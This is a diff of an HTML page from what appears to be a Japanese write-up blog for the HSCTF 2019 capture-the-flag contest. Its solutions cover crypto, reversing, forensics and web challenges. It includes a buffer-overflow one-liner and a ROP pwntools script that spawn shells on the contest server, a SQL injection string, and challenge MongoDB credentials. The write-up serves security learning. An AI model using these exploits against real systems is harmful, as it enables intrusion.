-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -982,39 +923,30 @@ c = 3280552792121286168982038099830397087874903846507258907485769272088830553814
 <span class="n">d</span> <span class="o">=</span> <span class="n">inverse</span><span class="p">(</span><span class="n">e</span><span class="p">,</span><span class="n">phi</span><span class="p">)</span>
 <span class="n">m</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">d</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
 
-<span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">format</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span></code></pre></td></tr></table>
+<span class="k">print</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">format</span><span class="p">(</span><span class="n">m</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br>
-Flag: <code>hsctf{y3s_rsa_1s_s0lved_10823704961253}</code></p>
-
+</div><br>
+Flag: `hsctf{y3s_rsa_1s_s0lved_10823704961253}`
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="reversing-a-byte">[Reversing]: A Byte</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-8">Challenge</h3>
-
 <blockquote>
 <p>Just one byte makes all the difference.</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>a-byte</li>
 </ul>
-
 <h3 id="solution-6">Solution</h3>
-
 <p>ghidraでde-compileすると、FUN_0010073a()のところで、以下の部分が見つかります。
 <br />
 （以下、抜粋です。）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1123,53 +1055,43 @@ Flag: <code>hsctf{y3s_rsa_1s_s0lved_10823704961253}</code></p>
         <span class="k">goto</span> <span class="n">LAB_00100891</span><span class="p">;</span>
       <span class="p">}</span>
     <span class="p">}</span>
-  <span class="p">}</span></code></pre></td></tr></table>
+  <span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>1でXORしてるので、実際にやってみます。
+</div><p>1でXORしてるので、実際にやってみます。</p>
 <pre>
 $ python
-&gt;&gt;&gt; ord('i')
+>>> ord('i')
 105
-&gt;&gt;&gt; chr(105^1)
+>>> chr(105^1)
 'h'
-&gt;&gt;&gt; chr(0x72^1)
+>>> chr(0x72^1)
 's'
 </pre>
-フラグの先頭<code>hs</code>が見えましたね。残りも処理してフラグゲットです。
+<p>フラグの先頭<code>hs</code>が見えましたね。残りも処理してフラグゲットです。
 <br /><br /></p>
-
 <p>Flag: <code>hsctf{w0w_y0u_kn0w_d4_wA3_8h2bA029}</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="pwn-return-to-sender">[Pwn]: Return to Sender</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-9">Challenge</h3>
-
 <blockquote>
 <p>Who knew the USPS could lose a letter so many times?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>return-to-sender</li>
 <li>return-to-sender.c</li>
 </ul>
-
 <h3 id="solution-7">Solution</h3>
-
 <p>バッファオーバーフローの問題です。EIPが奪えるので、オフセット20バイトの後に、<code>system(&quot;/bin/sh&quot;);</code>を呼んでいる<code>win()</code>のアドレス<code>0x080491b6</code>を設定するだけです。
-<br /><br />
+<br /><br /></p>
 <pre>
-# (python -c 'print(&quot;AAAAAAAAAAAAAAAAAAAA\xb6\x91\x04\x08&quot;)'; cat) | nc pwn.hsctf.com 1234
-Where are you sending your mail to today? Alright, to AAAAAAAAAAAAAAAAAAAA? it goes!</p>
+\# (python -c 'print("AAAAAAAAAAAAAAAAAAAA\xb6\x91\x04\x08")'; cat) | nc pwn.hsctf.com 1234
+Where are you sending your mail to today? Alright, to AAAAAAAAAAAAAAAAAAAA? it goes!
 
-<p>ls
+ls
 bin
 dev
 flag
@@ -1180,39 +1102,31 @@ return-to-sender
 return-to-sender.c
 cat flag
 hsctf{fedex_dont_fail_me_now}
-</pre></p>
-
-<p><br>
-Flag: <code>hsctf{fedex_dont_fail_me_now}</code></p>
-
+</pre>
+<br>
+Flag: `hsctf{fedex_dont_fail_me_now}`
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="pwn-combo-chain-lite">[Pwn]: Combo Chain Lite</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-10">Challenge</h3>
-
 <blockquote>
 <p>Training wheels!
 <br /><br />
 nc pwn.hsctf.com 3131
 <br /><br />
-Note: If you're trying to use python or a similar program to run your exploit, make sure to keep stdin alive with cat, like this: <code>(python; cat -) | nc pwn.hsctf.com &lt;port&gt;</code>
+Note: If you&rsquo;re trying to use python or a similar program to run your exploit, make sure to keep stdin alive with cat, like this: <code>(python; cat -) | nc pwn.hsctf.com &lt;port&gt;</code>
 <br /><br />
-Hint: What's a ROP?</p>
+Hint: What&rsquo;s a ROP?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>combo-chain-lite</li>
-
-<li><p>combo-chain-lite.c</p>
+<li>combo-chain-lite.c</li>
+</ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-c" data-lang="c"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1251,15 +1165,11 @@ Hint: What's a ROP?</p>
 	<span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span><span class="n">gid</span><span class="p">,</span><span class="n">gid</span><span class="p">);</span>
 	<span class="n">vuln</span><span class="p">();</span>
 	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>	
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div></li>
-</ul>
-
-<h3 id="solution-8">Solution</h3>
-
+</div><h3 id="solution-8">Solution</h3>
 <p>system()関数のアドレス（毎回異なる）がprintされるので、それを使います。</p>
-
 <pre>
 # checksec combo-chain-lite 
 [*] '/root/HSCTF_CTF_2019/combo-chain-lite'
@@ -1281,12 +1191,11 @@ Hint: What's a ROP?</p>
 0x0000000000401271 : pop rsi ; pop r15 ; ret
 0x000000000040126d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
 </pre>
-
 <p><br />
 以下を書きました。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1345,14 +1254,14 @@ Hint: What's a ROP?</p>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">system_addr</span><span class="o">.</span><span class="n">group</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))</span>
 
 <span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Dude you hear about that new game called /bin/sh? Enter the right combo for some COMBO CARNAGE!: &#34;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></td></tr></table>
+<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br />
+</div><p><br />
 実行結果です。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1375,7 +1284,7 @@ Hint: What's a ROP?</p>
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># ./combo-chain-lite_solve2.py</span> 
-<span class="o">[</span>+<span class="o">]</span> Opening connection to pwn.hsctf.com on port <span class="m">3131</span>: Done
+<span class="o">[</span>+<span class="o">]</span> Opening connection to pwn.hsctf.com on port 3131: Done
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/root/HSCTF_CTF_2019/combo-chain-lite&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -1393,220 +1302,154 @@ lib
 lib32
 lib64
 $ cat flag
-hsctf<span class="o">{</span>wheeeeeee_that_was_fun<span class="o">}</span></code></pre></td></tr></table>
+hsctf<span class="o">{</span>wheeeeeee_that_was_fun<span class="o">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p><br>
-Flag: <code>hsctf{wheeeeeee_that_was_fun}</code></p>
-
+</div><br>
+Flag: `hsctf{wheeeeeee_that_was_fun}`
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="forensics-chicken-crossing">[Forensics]: Chicken Crossing</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-11">Challenge</h3>
-
 <blockquote>
 <p>Keith is watching chickens cross a road in his grandfather’s farm. He once heard from his grandfather that there was something significant about this behavior, but he can’t figure out why. Help Keith discover what the chickens are doing from this seemingly simple behavior.</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>hsctf-chicken_crossing.jpg</li>
 </ul>
-
 <h3 id="solution-9">Solution</h3>
-
 <pre>
 $ strings hsctf-chicken_crossing.jpg | grep hsctf
 hsctf{2_get_2_the_other_side}
 </pre>
-
-<p><br>
-Flag: <code>hsctf{2_get_2_the_other_side}</code></p>
-
+<br>
+Flag: `hsctf{2_get_2_the_other_side}`
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="forensics-cool-image">[Forensics]: Cool Image</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-12">Challenge</h3>
-
 <blockquote>
-<p>My friend told me he found a really cool image, but I couldn't open it. Can you help me access the image?</p>
+<p>My friend told me he found a really cool image, but I couldn&rsquo;t open it. Can you help me access the image?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>cool.pdf</li>
 </ul>
-
 <h3 id="solution-10">Solution</h3>
-
 <pre>
 $ file cool.pdf
 cool.pdf: PNG image data, 1326 x 89, 8-bit/color RGBA, non-interlaced
 </pre>
-
 <p>実は pdf じゃなくて png なので、開いて画像を確認するだけです。</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="forensics-cool-image-2">[Forensics]: Cool Image 2</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-13">Challenge</h3>
-
 <blockquote>
-<p>My friend sent me this image, but I can't open it. Can you help me open the image?</p>
+<p>My friend sent me this image, but I can&rsquo;t open it. Can you help me open the image?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>cool.png</li>
 </ul>
-
 <h3 id="solution-11">Solution</h3>
-
-<p>ファイルの先頭にゴミがついているので、消すだけです。
+<p>ファイルの先頭にゴミがついているので、消すだけです。</p>
 <pre>
 $ xxd cool.png | head -n 4
 00000000: 4920 666f 756e 6420 7468 6973 2063 6f6f  I found this coo
 00000010: 6c20 6669 6c65 2e20 4974 7320 7265 616c  l file. Its real
 00000020: 6c79 2063 6f6f 6c21 0a89 504e 470d 0a1a  ly cool!..PNG...
 00000030: 0a00 0000 0d49 4844 5200 0004 b600 0000  .....IHDR.......
-</pre></p>
-
+</pre>
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="forensics-slap">[Forensics]: Slap</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-14">Challenge</h3>
-
 <blockquote>
-<p>Don't get slapped too hard.</p>
+<p>Don&rsquo;t get slapped too hard.</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>slap.jpg</li>
 </ul>
-
 <h3 id="solution-12">Solution</h3>
-
 <p>Lorem ipsum （俗に言うダミーテキスト）だったので、うっかり見逃しそうでした。</p>
-
 <p><code>$ exiftool slap.jpg | grep hsctf</code>
 <br />
-Location Shown Country Name     : Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut la bore et dolore magna aliqua. Massa id neque aliquam vestibulum morbi blandit cursu <code>hsctf{twoslapsnonetforce}</code> s risus. Sed viverra ipsum nunc aliquet bibendum. Nisl purus in mollis nunc sed. Risus commodo viverra maecenas accumsan lacus vel facil...(snip)</p>
-
-<p><br>
-Flag: <code>hsctf{twoslapsnonetforce}</code></p>
-
+Location Shown Country Name     : Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut la bore et dolore magna aliqua. Massa id neque aliquam vestibulum morbi blandit cursu <code>hsctf{twoslapsnonetforce}</code> s risus. Sed viverra ipsum nunc aliquet bibendum. Nisl purus in mollis nunc sed. Risus commodo viverra maecenas accumsan lacus vel facil&hellip;(snip)</p>
+<br>
+Flag: `hsctf{twoslapsnonetforce}`
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="forensics-fish">[Forensics]: Fish</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-15">Challenge</h3>
-
 <blockquote>
 <p>I got a weird image from some fish. What is this?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>fish.jpg</li>
 </ul>
-
 <h3 id="solution-13">Solution</h3>
-
-<p>「青い空を見上げればいつもそこに白い猫」で開くと、&quot;Steghide適用可能性データ&quot;というのが見えます。
+<p>「青い空を見上げればいつもそこに白い猫」で開くと、&ldquo;Steghide適用可能性データ&quot;というのが見えます。
 <br />
 <img src="https://captureamerica.github.io/writeups/img/possible_steg.png" alt="possible_steg.png"></p>
-
-<p>Passphraseがさっぱり検討つかなかったんですが、stringsの一番最後に出てくる<code>bobross63</code>を使ったら解けました。
+<p>Passphraseがさっぱり検討つかなかったんですが、stringsの一番最後に出てくる<code>bobross63</code>を使ったら解けました。</p>
 <pre>
 $ strings fish.jpg | tail -n 1
 bobross63
 </pre>
 <pre>
-C:\ols\steghide&gt;steghide.exe extract -sf fish.jpg
+C:\ols\steghide>steghide.exe extract -sf fish.jpg
 Enter passphrase: bobross63
-wrote extracted data to &quot;flag.txt&quot;.
-C:\ols\steghide&gt;more flag.txt
+wrote extracted data to "flag.txt".
+C:\ols\steghide>more flag.txt
 hsctf{fishy_fishy_fishy_fishy_fishy_fishy_fishy123123123123}
-</pre></p>
-
-<p><br>
-Flag: <code>hsctf{fishy_fishy_fishy_fishy_fishy_fishy_fishy123123123123}</code></p>
-
+</pre>
+<br>
+Flag: `hsctf{fishy_fishy_fishy_fishy_fishy_fishy_fishy123123123123}`
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="web-inspect-me">[Web]: Inspect Me</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-16">Challenge</h3>
-
 <blockquote>
-<p>Keith's little brother messed up some things...
+<p>Keith&rsquo;s little brother messed up some things&hellip;
 <br /><br />
-<a href="https://inspect-me.web.chal.hsctf.com" target="_blank">https://inspect-me.web.chal.hsctf.com</a>
+<a href="https://inspect-me.web.chal.hsctf.com">https://inspect-me.web.chal.hsctf.com</a>
 <br /><br />
 Note: There are 3 parts to the flag!</p>
 </blockquote>
-
 <h3 id="solution-14">Solution</h3>
-
 <p>View page source</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="web-agent-keith">[Web]: Agent Keith</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-17">Challenge</h3>
-
 <blockquote>
 <p>Keith was looking at some old browsers and made a site to hold his flag.
 <br /><br />
-<a href="https://agent-keith.web.chal.hsctf.com" target="_blank">https://agent-keith.web.chal.hsctf.com</a></p>
+<a href="https://agent-keith.web.chal.hsctf.com">https://agent-keith.web.chal.hsctf.com</a></p>
 </blockquote>
-
 <h3 id="solution-15">Solution</h3>
-
-<p>上記にアクセスすると、
+<p>上記にアクセスすると、</p>
 <pre>
 If you're not Keith, you won't get the flag!
-Your agent is: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36</p>
+Your agent is: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
 
-<p>Flag: Access Denied
-</pre></p>
-
+Flag: Access Denied
+</pre>
 <p>User-Agentは古ければなんでもいいわけじゃなくて、特定のものを指定しないといけないです。View Page Sourceより、</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-html" data-lang="html"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1641,76 +1484,52 @@ Your agent is: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.3
             <span class="c">&lt;!-- DEBUG (remove me!!): NCSA_Mosaic/2.0 (Windows 3.1) --&gt;</span>
         <span class="p">&lt;/</span><span class="nt">main</span><span class="p">&gt;</span>
     <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span></code></pre></td></tr></table>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<pre>
+</div><pre>
 $ wget -O - https://agent-keith.web.chal.hsctf.com/ --user-agent="NCSA_Mosaic/2.0 (Windows 3.1)"
 hsctf{wow_you_are_agent_keith_now}
 </pre>
-
-<p><br>
-Flag: <code>hsctf{wow_you_are_agent_keith_now}</code></p>
-
+<br>
+Flag: `hsctf{wow_you_are_agent_keith_now}`
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="web-s-q-l">[Web]: S-Q-L</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-18">Challenge</h3>
-
 <blockquote>
 <p>Keith keeps trying to keep his flag safe. This time, he used a database and some PHP.
 <br /><br />
-<a href="https://s-q-l.web.chal.hsctf.com/" target="_blank">https://s-q-l.web.chal.hsctf.com/</a></p>
+<a href="https://s-q-l.web.chal.hsctf.com/">https://s-q-l.web.chal.hsctf.com/</a></p>
 </blockquote>
-
 <h3 id="solution-16">Solution</h3>
-
 <p><code>' or '1'='1</code></p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="web-the-quest">[Web]: The Quest</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-19">Challenge</h3>
-
 <blockquote>
-<p>You think you are worthy of obtaining the flag? Try your hand at <a href="https://forms.gle/7pyAWuG3GvYL443NA" target="_blank">The Quest to Obtain the Flag.</a></p>
+<p>You think you are worthy of obtaining the flag? Try your hand at <a href="https://forms.gle/7pyAWuG3GvYL443NA">The Quest to Obtain the Flag.</a></p>
 </blockquote>
-
 <h3 id="solution-17">Solution</h3>
-
 <p>View Page Sourceでフラグを見つけてしまった。</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="web-keith-logger">[Web]: Keith Logger</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-20">Challenge</h3>
-
 <blockquote>
-<p>Keith is up to some evil stuff! Can you figure out what he's doing and find the flag?
+<p>Keith is up to some evil stuff! Can you figure out what he&rsquo;s doing and find the flag?
 <br /><br />
 Note: nothing is actually saved</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>extension.crx</li>
 </ul>
-
 <h3 id="solution-18">Solution</h3>
-
 <p>これは今までやったことのないタイプの問題で面白かったです。
 <br /><br />
 crxは、Chromeのエクステンション。
@@ -1719,11 +1538,11 @@ crxは、Chromeのエクステンション。
 <br /><br />
 ググってみると、crxファイルは中身が見えるとのこと。以下のサイトでソースを取り出しました。
 <br />
-<a href="https://robwu.nl/crxviewer/" target="_blank">https://robwu.nl/crxviewer/</a>
+<a href="https://robwu.nl/crxviewer/">https://robwu.nl/crxviewer/</a>
 <br /><br /></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1787,46 +1606,33 @@ crxは、Chromeのエクステンション。
     <span class="p">});</span>
 </code></pre></td></tr></table>
 </div>
-</div>
-<p>最初は、<a href="https://keith-logger.web.chal.hsctf.com/api/record" target="_blank">https://keith-logger.web.chal.hsctf.com/api/record</a> の方にいろんなGETを投げてごちゃごちゃやってたんですが、Time情報が取れるだったので諦めて、次の <a href="https://keith-logger.web.chal.hsctf.com/api/admin" target="_blank">https://keith-logger.web.chal.hsctf.com/api/admin</a>  の方にアクセス。</p>
-
+</div><p>最初は、https://keith-logger.web.chal.hsctf.com/api/record の方にいろんなGETを投げてごちゃごちゃやってたんですが、Time情報が取れるだったので諦めて、次の <a href="https://keith-logger.web.chal.hsctf.com/api/admin">https://keith-logger.web.chal.hsctf.com/api/admin</a>  の方にアクセス。</p>
 <p><br />
-以下が返ってきました。
+以下が返ってきました。</p>
 <pre>
 didn't have time to implement this page yet. use admin:keithkeithkeith@keith-logger-mongodb.web.chal.hsctf.com:27017 for now
-</pre></p>
-
+</pre>
 <p><br />
 mongodbには、<code>Robo 3T</code>というツールを使いました。
 <br />
 <img src="https://captureamerica.github.io/writeups/img/Keith_Bot_Mongo.png" alt="Keith_Bot_Mongo.png"></p>
-
-<p><br>
-Flag: <code>hsctf{watch_out_for_keyloggers}</code></p>
-
+<br>
+Flag: `hsctf{watch_out_for_keyloggers}`
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="web-accessible-rich-internet-applications">[Web]: Accessible Rich Internet Applications</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-21">Challenge</h3>
-
 <blockquote>
 <p>A very considerate fellow, Rob believes that accessibility is very important!
 <br /><br />
 NOTE: The flag for this challenge starts with flag{ instead of hsctf{</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>index.html</li>
 </ul>
-
 <h3 id="solution-19">Solution</h3>
-
 <p>添付の<code>index.html</code>には難読化された非常に長いJavascriptが含まれています。
 <br />
 ChromeのDeveloper ToolsでまずBeautifyして、mをWatchに追加して実行し、mを別ファイル（aaa.htm）として保存しました。
@@ -1839,130 +1645,85 @@ ChromeのDeveloper ToolsでまずBeautifyして、mをWatchに追加して実行
 <br /><br />
 これを、bbb.txtとして保存しておきます。
 <br /><br />
-&quot;0&quot;と&quot;1&quot;が見えるので、2進数を文字列に変換する系ですね。ただし、<code>aria-posinset</code>の箇所で順番が指定されているようなので、sortが必要です。</p>
-
+&ldquo;0&quot;と&quot;1&quot;が見えるので、2進数を文字列に変換する系ですね。ただし、<code>aria-posinset</code>の箇所で順番が指定されているようなので、sortが必要です。</p>
 <p><code>$ grep 1040 bbb.txt | cut -d'&quot;' -f4,7 | sort -n | sed -E 's/.*&gt;([01]).*/\1/' | tr -d '\n' ; echo</code>
 01101001011011010010000001100111011011110110111001101110011000010010000001100001011001000110010000100000011100110110111101101101011001010010000001100110011010010110110001101100011001010111001000100000011101000110010101111000011101000010000001101000011001010111001001100101001000000111001101101111001000000111010001101000011001010010000001110000011000010110011101100101001000000110100101110011001000000110000100100000011000100110100101110100001000000110110001101111011011100110011101100101011100100010111000100000011011000110111101110010011001010110110100100000011010010111000001110011011101010110110100101110001011100010111000100000011010000110010101110010011001010010011101110011001000000111010001101000011001010010000001100110011011000110000101100111001000000110001001110100011101110010110000100000011001100110110001100001011001110111101101100001011000110110001101100101011100110111001101101001011000100110100101101100011010010111010001111001010111110110100101110011010111110110001101110010011101010110001101101001011000010110110001111101</p>
-
 <p><br />
 文字列への変換は、またこちらのサイトにお世話になりました。<br />
-<a href="https://dencode.com/ja/string/bin" target="_blank">https://dencode.com/ja/string/bin</a></p>
-
-<p>im gonna add some filler text here so the page is a bit longer. lorem ipsum... here's the flag btw, flag{accessibility_is_crucial}</p>
-
-<p><br>
-Flag: <code>flag{accessibility_is_crucial}</code></p>
-
+<a href="https://dencode.com/ja/string/bin">https://dencode.com/ja/string/bin</a></p>
+<p>im gonna add some filler text here so the page is a bit longer. lorem ipsum&hellip; here&rsquo;s the flag btw, flag{accessibility_is_crucial}</p>
+<br>
+Flag: `flag{accessibility_is_crucial}`
 <p><br /><br />
 <br /><br />
 <img src="https://captureamerica.github.io/writeups/img/orange_bar.png" alt="orange_bar.png">
 <br />
 ここから下はCTF終了後（2020/01/19）に行った復習です。他の方のWriteupとか参照してます。</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="misc-hidden-flag">[Misc]: Hidden Flag</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-22">Challenge</h3>
-
 <blockquote>
-<p>This image seems wrong.....did Keith lose the key <b>again</b>?</p>
+<p>This image seems wrong&hellip;..did Keith lose the key <b>again</b>?</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>chall.png</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-20">Solution</h3>
-
 <p>こわれたpngっぽいです。</p>
-
 <pre>
 $ file chall.png 
 chall.png: data
 </pre>
-
-<p>stringsで、以下が見つかります。
+<p>stringsで、以下が見つかります。</p>
 <pre>
-$ strings chall.png
+$ strings chall.png 
 :
 :
 key is invisible
-</pre></p>
-
-<p>これ、「keyは隠れているよ」という意味かと思ったら、「keyは &quot;invisible&quot; だよ」という意味だったようです。</p>
-
+</pre>
+<p>これ、「keyは隠れているよ」という意味かと思ったら、「keyは &ldquo;invisible&rdquo; だよ」という意味だったようです。</p>
 <p>あと、XORという発想がわきませんでした。。。</p>
-
 <div class="admonition tip"><p class="admonition-title">Tips</p>
-  
-KeyというのがあったらXORを疑う
-
+<p>KeyというのがあったらXORを疑う</p>
 </div>
-
 <p><br />
 Pythonを使ってXORします。</p>
-
 <pre>
 $ python -c 'import pwn;open("out","w").write(pwn.xor(open("chall.png").read(),"invisible"))'
 
 $ file out
 out: PNG image data, 665 x 268, 8-bit/color RGB, non-interlaced
 </pre>
-
-<p><img src="https://captureamerica.github.io/writeups/img/hsctf_chall.png" alt="hsctf_chall.png"></p>
-
+<img src="https://captureamerica.github.io/writeups/img/hsctf_chall.png" alt="hsctf_chall.png">
 <p>Flag: <code>hsctf{n0t_1nv1s1bl3_an5m0r3?-39547632}</code></p>
-
 <p><br /><br />
-ちなみに、xortool (<a href="https://github.com/hellman/xortool" target="_blank">https://github.com/hellman/xortool</a>) を使った解き方もあるようです。</p>
-
-<p><img src="https://captureamerica.github.io/writeups/img/hsctf_xortool.png" alt="hsctf_xortool.png"></p>
-
+ちなみに、xortool (<a href="https://github.com/hellman/xortool">https://github.com/hellman/xortool</a>) を使った解き方もあるようです。</p>
+<img src="https://captureamerica.github.io/writeups/img/hsctf_xortool.png" alt="hsctf_xortool.png">
 <p>ここでも、keyが<code>invisible</code>なのがわかりますね。</p>
-
 <p>オプションで、<code>-c 00</code>を渡さないといけないんですが（-cは、most frequent charのオプション）、なんで<code>00</code>なのかがよくわからないです。</p>
-
 <p>xxdで眺めても、<code>00</code>が頻繁に出てきているわけでもないし。。。</p>
-
-<p><a href="https://github.com/hellman/xortool" target="_blank">https://github.com/hellman/xortool</a> の解説中には、<code># 00 is the most frequent byte in binaries</code>と書かれてますけど。</p>
-
+<p><a href="https://github.com/hellman/xortool">https://github.com/hellman/xortool</a> の解説中には、<code># 00 is the most frequent byte in binaries</code>と書かれてますけど。</p>
 <p>ま、とにかくxortoolを実行すると、./xortool_out/0.out というファイルが自動生成されてて、前述したのと同じPNG画像が取れます。</p>
-
 <p><br /><br />
 <br /><br /></p>
-
 <h2 id="misc-logo-sucks-bad">[Misc]: Logo Sucks Bad</h2>
-
-<hr />
-
+<hr>
 <h3 id="challenge-23">Challenge</h3>
-
 <blockquote>
 <p>This logo sucks bad.</p>
 </blockquote>
-
 <p>Attachment:</p>
-
 <ul>
 <li>logo.png</li>
 </ul>
-
 <p><br /></p>
-
 <h3 id="solution-21">Solution</h3>
-
 <p>zstegでフラグが取れるやつでした。</p>
-
-<p>&quot;Lorem ipsum&quot; だしと思って無視しちゃったんだけど、CTFでは &quot;Lorem ipsum&quot; は逆に無視しちゃいけないやつですな。</p>
-
+<p>&ldquo;Lorem ipsum&rdquo; だしと思って無視しちゃったんだけど、CTFでは &ldquo;Lorem ipsum&rdquo; は逆に無視しちゃいけないやつですな。</p>
 <pre>
 $ zsteg logo.png 
 b1,r,msb,xy         .. text: "NHzjjVhzXHh"
@@ -1975,76 +1736,52 @@ b4,rgb,lsb,xy       .. text: "EDUDETUUEUDTETEEETUEDTDDETTEEUDDEUDUEUEEETUEDTDDET
